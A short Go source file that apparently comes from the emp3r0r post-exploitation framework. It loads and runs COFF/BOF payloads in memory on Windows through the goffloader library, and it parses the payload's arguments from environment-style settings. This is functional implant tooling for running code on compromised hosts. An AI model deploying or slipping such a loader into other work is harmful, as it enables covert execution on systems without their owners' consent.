//go:build windows

package modules

import (
	"fmt"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/kballard/go-shellquote"
	"github.com/praetorian-inc/goffloader/src/coff"
	"github.com/praetorian-inc/goffloader/src/lighthouse"
)

// runCOFFModule executes a COFF/BOF payload using goffloader on Windows.
func runCOFFModule(payload []byte, env []string) (string, error) {
	args, err := parseCOFFArgs(env)
	if err != nil {
		return "", err
	}

	packedArgs, err := lighthouse.PackArgs(args)
	if err != nil {
		return "", fmt.Errorf("packing BOF args: %w", err)
	}

	output, err := coff.Load(payload, packedArgs)
	if err != nil {
		return "", fmt.Errorf("executing COFF module: %w", err)
	}

	return output, nil
}

func parseCOFFArgs(env []string) ([]string, error) {
	var args []string

	for _, entry := range env {
		key, val, ok := strings.Cut(entry, "=")
		if !ok {
			continue
		}

		if !strings.EqualFold(key, "args") && !strings.EqualFold(key, "bof_args") {
			continue
		}

		if val == "" {
			continue
		}

		tokens, err := shellquote.Split(val)
		if err != nil {
			logging.Debugf("parse COFF args failed (%v), falling back to whitespace split", err)
			tokens = strings.Fields(val)
		}

		for _, t := range tokens {
			if t == "" {
				continue
			}
			args = append(args, t)
		}
	}

	return args, nil
}
